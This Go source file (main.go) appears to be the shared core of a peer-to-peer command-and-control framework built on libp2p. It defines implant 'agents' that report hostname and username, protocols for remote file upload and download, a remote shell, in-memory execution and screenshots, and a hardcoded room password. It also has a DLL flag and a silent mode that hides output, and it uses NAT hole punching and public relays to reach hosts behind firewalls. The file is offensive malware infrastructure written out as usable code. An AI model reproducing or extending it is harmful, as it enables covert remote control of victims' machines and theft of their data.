// main.go shared code
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/charmbracelet/lipgloss"
	"github.com/libp2p/go-libp2p"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/p2p/discovery/routing"
	"github.com/libp2p/go-libp2p/p2p/net/connmgr"
	"github.com/multiformats/go-multiaddr"
)

var (
	cyan   = lipgloss.Color("#06b6d4")
	purple = lipgloss.Color("#8b5cf6")
	pink   = lipgloss.Color("#ec4899")
	green  = lipgloss.Color("#10b981")
	red    = lipgloss.Color("#ef4444")
	yellow = lipgloss.Color("#f59e0b")
	
	// Global flag to indicate if running as DLL
	IsDLL = false
)

// Agent Info
type Agent struct {
	ID       peer.ID
	Nickname string
	OS       string
	Hostname string
	Username string
	FirstSeen time.Time
	LastSeen time.Time
	Color    lipgloss.Color
}

// File Transfer Protocol
const FileProtocol = "/c2/file/1.0"
const ShellProtocol = "/c2/shell/1.0"
const MemExecProtocol = "/c2/memexec/1.0"
const ScreenshotProtocol = "/c2/screenshot/1.0"

type FileRequest struct {
	Operation string `json:"op"`   // "upload" or "download"
	Path      string `json:"path"` // Remote path
	Size      int64  `json:"size"` // File size (for upload)
	Mode      uint32 `json:"mode"` // File mode
}

type FileResponse struct {
	Success bool   `json:"success"`
	Message string `json:"msg"`
	Size    int64  `json:"size"` // File size (for download)
}

type MemExecRequest struct {
	Args []string `json:"args"`
	Size int64    `json:"size"`
}

// Message for discovery & presence
type Beacon struct {
	Type     string `json:"type"`
	AgentID  string `json:"id"`
	Nickname string `json:"nick"`
	OS       string `json:"os"`
	Hostname string `json:"host"`
	Username string `json:"user"`
}

var (
	agents      = make(map[peer.ID]*Agent)
	agentsMu    sync.RWMutex
	roomHash    string
	securityMgr *SecurityManager // Security manager for encryption
)

// Config for agent (hardcoded)
const (
	DefaultRoom = "MrR00mm"
	DefaultPass = "MyPasxxxxxxx"
)

func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Initialize security manager with password
	securityMgr = NewSecurityManager(DefaultPass)

	// Run mode determined by build tags
	run(ctx)
}

func setupLibp2p(ctx context.Context, silent bool) (host.Host, *dht.IpfsDHT, *routing.RoutingDiscovery, error) {
	// Connection Manager: Low 5, High 20, Grace 1 min
	cm, err := connmgr.NewConnManager(
		5,
		20,
		connmgr.WithGracePeriod(time.Minute),
	)
	if err != nil {
		return nil, nil, nil, err
	}

	h, err := libp2p.New(
		libp2p.ListenAddrStrings(
			"/ip4/0.0.0.0/tcp/0",
			"/ip4/0.0.0.0/udp/0/quic",
			"/ip4/0.0.0.0/udp/0/quic-v1",
		),
		libp2p.ConnectionManager(cm), // Apply Connection Manager
		libp2p.NATPortMap(),
		libp2p.EnableNATService(),
		libp2p.EnableHolePunching(),
		libp2p.EnableAutoRelayWithStaticRelays([]peer.AddrInfo{}),
		libp2p.EnableRelayService(),
		libp2p.DefaultTransports,
		libp2p.DefaultSecurity,
		libp2p.DefaultMuxers,
	)
	if err != nil {
		return nil, nil, nil, err
	}

	bootstrapPeers := []string{
		"/dnsaddr/bootstrap.libp2p.io/p2p/QmNnooDu7bfjPFoTZYxMNLWUQJyrVwtbZg5gBMjTezGAJN",
		"/dnsaddr/bootstrap.libp2p.io/p2p/QmQCU2EcMqAqQPR2i9bChDtGNJchTbq5TbXJJ16u19uLTa",
		"/dnsaddr/bootstrap.libp2p.io/p2p/QmbLHAnMoJPWSCR5Zhtx6BHJX9KiKNN6tpvbUcqanj75Nb",
		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
	}

	var parsedPeers []peer.AddrInfo
	for _, addr := range bootstrapPeers {
		maddr, err := multiaddr.NewMultiaddr(addr)
		if err != nil {
			continue
		}
		peerInfo, err := peer.AddrInfoFromP2pAddr(maddr)
		if err != nil {
			continue
		}
		parsedPeers = append(parsedPeers, *peerInfo)
	}

	dhtNode, err := dht.New(ctx, h,
		dht.Mode(dht.ModeClient), // Force Client Mode (Low Memory)
		dht.BootstrapPeers(parsedPeers...),
	)
	if err != nil {
		return nil, nil, nil, err
	}
	if err = dhtNode.Bootstrap(ctx); err != nil {
		return nil, nil, nil, err
	}

	// Connect to bootstrap
	if !silent {
		fmt.Printf("Connecting to %d bootstrap peers...\n", len(parsedPeers))
	}
	var wg sync.WaitGroup
	connected := 0
	for _, peerInfo := range parsedPeers {
		wg.Add(1)
		go func(pi peer.AddrInfo) {
			defer wg.Done()
			connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
			defer cancel()
			if err := h.Connect(connectCtx, pi); err == nil {
				connected++
			}
		}(peerInfo)
	}
	wg.Wait()

	if !silent {
		fmt.Printf("✓ Connected to %d bootstrap peers\n", connected)
	}

	rd := routing.NewRoutingDiscovery(dhtNode)
	return h, dhtNode, rd, nil
}

func generateRoomHash(room, password string) string {
	if password != "" {
		hash := sha256.Sum256([]byte(room + password + "c2-salt-v1"))
		return hex.EncodeToString(hash[:])
	}
	return room
}

// Suppress output for silent mode
func setSilentMode() {
	// Redirect stdout/stderr to null
	devNull, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	os.Stdout = devNull
	os.Stderr = devNull
}
